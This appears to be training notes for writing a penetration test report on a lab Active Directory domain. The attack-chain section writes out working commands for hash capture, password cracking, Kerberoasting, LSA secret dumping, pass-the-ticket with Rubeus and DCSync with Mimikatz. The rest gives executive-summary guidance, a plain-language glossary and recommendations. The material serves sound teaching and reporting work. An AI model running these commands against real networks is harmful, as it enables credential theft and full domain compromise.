## Attack Chain

1. The tester utilized the Responder tool to obtain an NTLMv2 password hash for a domain user, bsmith.
```shell-session
sudo responder -I eth0 -wrfv
```

2. This password hash was successfully cracked offline using the Hashcat tool to reveal the user's cleartext password, which granted a foothold into the INLANEFREIGHT.LOCAL domain, but with no more privileges than a standard domain user.
```shell-session
hashcat -m 5600 bsmith_hash /usr/share/wordlists/rockyou.txt 
```

3. The tester then ran the BloodHound.py tool, a Python version of the popular SharpHound collection tool to enumerate the domain and create visual representations of attack paths. Upon review, the tester found that multiple privileged users existed in the domain configured with Service Principal Names (SPNs), which can be leveraged to perform a Kerberoasting attack and retrieve TGS Kerberos tickets for the accounts which can be cracked offline using Hashcat if a weak password is set. From here, the tester used the GetUserSPNs.py tool to carry out a targeted Kerberoasting attack against the mssqlsvc account, having found that the mssqlsvc account had local administrator rights over the host SQL01.INLANEFREIGHT.LOCAL which was an interesting target in the domain.
```shell-session
sudo bloodhound-python -u 'bsmith' -p '<REDACTED>' -d inlanefreight.local -ns 192.168.195.204 -c All
```
```shell-session
GetUserSPNs.py INLANEFREIGHT.LOCAL/bsmith -dc-ip 192.168.195.204 -request-user mssqlsvc
```

4. The tester successfully cracked this account's password offline, revealing the cleartext value.
```shell-session
hashcat -m 13100 mssqlsvc_tgs /usr/share/wordlists/rockyou.txt
```

5. The tester authenticated to the host SQL01.INLANEFREIGHT.LOCAL and retrieved a cleartext password from the host's registry by decrypting LSA secrets for an account (srvadmin), which was set up for autologon.
```shell-session
crackmapexec smb 192.168.195.220 -u mssqlsvc -p <REDACTED> --lsa
```

6. This srvadmin account had local administrator rights over all servers (aside from Domain Controllers) in the domain, so the tester logged into the MS01.INLANEFREIGHT.LOCAL host and retrieved a Kerberos TGT ticket for a logged-in user, pramirez. This user was part of the Tier I Server Admins group, which granted the account DCSync rights over the domain object. This attack can be utilized to retrieve the NTLM password hash for any user in the domain, resulting in domain compromise and persistence via a Golden Ticket.
```shell-session
query user
```

7. The tester used the Rubeus tool to extract the Kerberos TGT ticket for the pramirez user and perform a Pass-the-Ticket attack to authenticate as this user.
```shell-session
.\Rubeus.exe triage
.\Rubeus.exe dump /luid:0x1a8b19 /service:krbtgt
.\Rubeus.exe ptt /ticket:doIFZDCCBWCgAwIBBaEDAgEWo<SNIP>
klist
```

8. Finally, the tester performed a DCSync attack after successfully authenticating with this user account via the Mimikatz tool, which ended in domain compromise.
```shell-session
.\mimikatz.exe
lsadump::dcsync /user:INLANEFREIGHT\administrator
```
```shell-session
sudo crackmapexec smb 192.168.195.204 -u administrator -H e4axxxxxxxxxxxxxxxx1c88c2e94cba2
```
```shell-session
secretsdump.py inlanefreight/administrator@192.168.195.204 -hashes ad3b435b51404eeaad3b435b51404ee:e4axxxxxxxxxxxxxxxx1c88c2e94cba2 -just-dc-ntlm
```


## Executive Summary

DO
- When talking about metrics, be as specific as possible.
- It's a summary. Keep it that way.
- Describe the types of things you managed to access (HR documents, banking systems, etc.)
- Describe the general things that need to improve to mitigate the risks you discovered
- Provide general expectation for how much effort will be necessary to fix some of this.

DO NOT
- Name or recommend specific vendors
- Use acronyms
- Include insignificant findings
- Complex vocabulary
- Reference a more technical section of the report

**Vocabulary Changes
VPN, SSH - a protocol used for secure remote administration
SSL/TLS - technology used to facilitate secure web browsing
Hash - the output from an algorithm commonly used to validate file integrity
Password Spraying - an attack in which a single, easily-guessable password is attempted for a large list of harvested user accounts
Password Cracking - an offline password attack in which the cryptographic form of a user’s password is converted back to its human-readable form
Buffer overflow/deserialization/etc. - an attack that resulted in remote command execution on the target host
OSINT - Open Source Intelligence Gathering, or hunting/using data about a company and its employees that can be found using search engines and other public sources without interacting with a company's external network
SQL injection/XSS - a vulnerability in which input is accepted from the user without sanitizing characters meant to manipulate the application's logic in an unintended manner


## Summary of Recommendations

1. Create a baseline security templates for Windows Server and Workstation hosts
2. Perform periodic Social Engineering engagements with follow-on debriefings and security awareness training to build a security-focused culture within the organization from the top down.


## Appendices

**Static Appendices
- Scope
- Methodology
- Severity Ratings
- Biographies

**Dynamic Appendices
- Exploitation Attempts and Payloads
- Compromised Credentials
- Configuration Changes
- Additional Affected Scope
- Information Gathering
- Domain Password Analysis
